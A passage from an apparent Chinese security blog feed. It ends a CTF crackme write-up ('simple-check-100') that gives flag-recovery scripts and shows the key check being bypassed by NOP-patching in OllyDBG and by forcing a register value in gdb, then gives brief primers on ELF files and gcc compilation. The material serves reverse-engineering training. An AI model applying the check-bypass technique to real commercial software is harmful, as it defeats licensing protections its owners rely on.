class="token number">7</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6AFEBDB6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v2 为异或的结果，v3 为 v2 的首地址，<code>*(v3 + j)</code> 为每一轮异或的结果<br>再与 <code>flag_data[4 * i + j]</code> 异或，得到异或之后的 <code>*(v3 + j)</code> 的结果：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x3dd376bb</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x44bb798b</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xecc8af22</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x9d7e5dc2</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x0c30177d</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x0d81d309</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb4530359</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里要注意：</strong><br><code>*(4 * i + v4)</code> 和 <code>0xDEADBEEF</code> 异或得到的 <code>*(v3 + j)</code> 也是一个 32 位（8 个十六进制）的数据<br>而 <code>flag_data[4 * i + j]</code> 是 8 位（2 个十六进制），因此 for 循环 <code>for ( j = 3; j &gt;= 0; --j )</code> 分四轮，每次用 <code>*(v3 + j)</code> 中的 2 个十六进制与 <code>flag_data[4 * i + j]</code> 的 2 个十六进制进行异或</p><p>之所以循环条件写的是 <code>for ( j = 3; j &gt;= 0; --j )</code>，是为了按小端序取 <code>flag_data[4 * i + j]</code> 中的数据来异或</p><p>看似 <code>*(v3 + j)</code> 中的数据是按正序来取的，但其实前面在处理 <code>*(4 * i + v4)</code> 的时候，已经将 <code>v7[]</code> 的小端序写成了大端序<br>所以 <code>*(v3 + j)</code> 正序其实对应的是 <code>*(4 * i + v4)</code> 的正序，也就是 <code>v7[]</code> 的反序<br>即：<mark>大地址和大地址异或，小地址和小地址异或，一一对应</mark></p><p>根据以上条件将代码复现一遍即可，程序运行后输出的就是 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>string <span class="token function">tohex</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">//定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">//存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">//以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">//合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//取右width位</span>    <span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">Hex_to_Dec</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 处理a-f</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">70</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 处理A-F</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 处理0-9</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        index<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xE37EC854</span><span class="token punctuation">,</span><span class="token number">0x9A16C764</span><span class="token punctuation">,</span><span class="token number">0x326511CD</span><span class="token punctuation">,</span><span class="token number">0x43D3E32D</span><span class="token punctuation">,</span><span class="token number">0xD29DA992</span><span class="token punctuation">,</span><span class="token number">0xD32C6DE6</span><span class="token punctuation">,</span><span class="token number">0x6AFEBDB6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    string key_data<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> flag_data<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span>            <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xD3</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key_xor<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> loop<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">tohex</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key_xor <span class="token operator">=</span> <span class="token function">Hex_to_Dec</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">+</span> loop<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            loop <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>key_xor <span class="token operator">^</span> flag_data<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE37EC854</span><span class="token punctuation">,</span> <span class="token number">0x9A16C764</span><span class="token punctuation">,</span> <span class="token number">0x326511CD</span><span class="token punctuation">,</span> <span class="token number">0x43D3E32D</span><span class="token punctuation">,</span> <span class="token number">0xD29DA992</span><span class="token punctuation">,</span> <span class="token number">0xD32C6DE6</span><span class="token punctuation">,</span> <span class="token number">0x6AFEBDB6</span><span class="token punctuation">]</span>flag_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">print</span>        <span class="token string">"The XOR value:"</span> <span class="token operator">+</span> tmp        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> flag_data<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag_is_you_know_cracking!!!</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%204.png" alt="攻防世界-simple-check-100 4.png"></p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>除直接解算法以外，还可以通过 OllyDBG 调试，绕过 if 判断语句，让程序自己输出 flag</p><p>将 32位 exe 程序拖入 OllyDBG，定位到 if 条件的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%205.png" alt="攻防世界-simple-check-100 5.png"></p><p>手动将这里的判断条件 <code>test eax,eax</code> 给 nop 掉</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%206.png" alt="攻防世界-simple-check-100 6.png"></p><p>执行程序，key 随便输入即可</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%207.png" alt="攻防世界-simple-check-100 7.png"></p><p>程序输出的 flag 是乱码，为：<code>潇g??礰Dn:,=瀋?h肀t</code></p><p>这里其实是 Windows 平台下的程序有问题，在 <code>key_data</code> 赋值那一段是错误的，导致绕过 <code>check_key</code> 之后也得不到正确的结果，换成 elf 文件来看才是正确的</p><hr><p>尝试在 linux 下进行调试<br>将 64 位 elf 程序拖入 Kali，执行语句：<code>gdb task9_x86_64_46d01fe312d35ecf69c4ff8ab8ace75d080891dc</code> 进行调试</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%208.png" alt="攻防世界-simple-check-100 8.png"></p><p>输入 <code>b main</code> 在 main 函数的位置下断点，输入 <code>r</code> 执行程序</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%209.png" alt="攻防世界-simple-check-100 9.png"></p><p>权限不够，发现文件没有执行权限，通过 <code>chmod</code> 增加执行权限，继续 <code>r</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%2010.png" alt="攻防世界-simple-check-100 10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%2011.png" alt="攻防世界-simple-check-100 11.png"></p><p>输入 <code>n</code> 单步执行，一直单步执行，到达输入 <code>key</code> 的地方，随便输入一个 <code>key</code> 值，继续：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%2012.png" alt="攻防世界-simple-check-100 12.png"></p><p>接下来继续单步执行 直到判断语句 <code>test eax,eax</code> 处，查看 eax 寄存器的值：<code>i r eax</code></p><p>把 <code>test eax,eax</code> 改为真就行，发现 <code>eax</code> 寄存器的值为 0，修改 <code>eax</code> 寄存器的值为 1，指令：<code>set $eax=1</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%2013.png" alt="攻防世界-simple-check-100 13.png"></p><p>输入 <code>c</code>，直接执行到程序结束</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%2014.png" alt="攻防世界-simple-check-100 14.png"></p><hr><h1 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag_is_you_know_cracking!!!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件</title>
      <link href="/posts/4ee8781c.html"/>
      <url>/posts/4ee8781c.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-文件"><a href="#ELF-文件" class="headerlink" title="ELF 文件"></a>ELF 文件</h1><p>可执行、可链接格式</p><hr><h1 id="ELF-文件类型"><a href="#ELF-文件类型" class="headerlink" title="ELF 文件类型"></a>ELF 文件类型</h1><h2 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h2><p>经过链接的、可执行的文件，也叫程序</p><h2 id="可重定位文件"><a href="#可重定位文件" class="headerlink" title="可重定位文件"></a>可重定位文件</h2><p>由源文件编译而成尚未链接的目标文件，通常以“.o”为扩展名</p><h2 id="共享目标文件"><a href="#共享目标文件" class="headerlink" title="共享目标文件"></a>共享目标文件</h2><p>动态链接库文件，在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或在文件加载时连接到进程中作为运行代码的一部分</p><p><strong>核心转储文件作为进程意外终止时进程地址空间的转储，也是 ELF 文件的一种</strong></p><hr><h1 id="ELF-文件的结构"><a href="#ELF-文件的结构" class="headerlink" title="ELF 文件的结构"></a>ELF 文件的结构</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E5%9F%BA%E7%A1%80_ELF%E6%96%87%E4%BB%B62.png" alt="Linux基础_ELF文件2.png"></p><p>从链接视角来看，通过 <strong>节（Section）</strong> 来进行划分</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E5%9F%BA%E7%A1%80_ELF%E6%96%87%E4%BB%B63.png" alt="Linux基础_ELF文件3.png"></p><p>从运行视角来看，通过 <strong>段（Segment）</strong> 来进行划分</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E5%9F%BA%E7%A1%80_ELF%E6%96%87%E4%BB%B64.png" alt="Linux基础_ELF文件4.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc编译过程</title>
      <link href="/posts/fb6b226e.html"/>
      <url>/posts/fb6b226e.html</url>
      
        <content type="html"><![CDATA[<h1 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h1><p>gcc 编译器可以将代码生成可执行文件，主要流程如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux-GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B1.png" alt="Linux-GCC编译过程1.png"></p><p>计算机只认识机器码，任何高级编程语言编写的程序运行都需要将代码转换为机器码，最后通过链接生成可执行文件</p><hr><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><blockquote><p>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名</p></blockquote><ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol><hr><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><blockquote><p>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</p></blockquote><ul><li>gcc 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，gcc 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><hr><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><blockquote><p>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</p></blockquote><ul><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd .o文件名 -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><blockquote><p>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</p></blockquote><ul><li>gcc 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>链接操作由链接器（<code>ld.so</code>）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul><hr><h1 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h1><blockquote><p>广义的可执行文件：文件中的数据是可执行代码的文件，例如 <code>.out</code>、<code>.exe</code>、<code>.sh</code>、<code>.py</code></p><p>狭义的可执行文件：文件中的数据是机器码的文件，例如 <code>.out</code>、<code>.exe</code>、<code>.dll</code>、<code>.so</code></p></blockquote><h2 id="Windows-PE"><a href="#Windows-PE" class="headerlink" title="Windows PE"></a>Windows PE</h2><ol><li>可执行程序 <code>.exe</code></li><li>动态链接库 <code>.dll</code></li><li>静态链接库 <code>.lib</code></li></ol><hr><h2 id="Linux-ELF"><a href="#Linux-ELF" class="headerlink" title="Linux ELF"></a>Linux ELF</h2><ol><li>可执行程序 <code>.out</code></li><li>动态链接库 <code>.so</code></li><li>静态链接库 <code>.a</code></li></ol><hr><h1 id="gcc-编译指令"><a href="#gcc-编译指令" class="headerlink" title="gcc 编译指令"></a>gcc 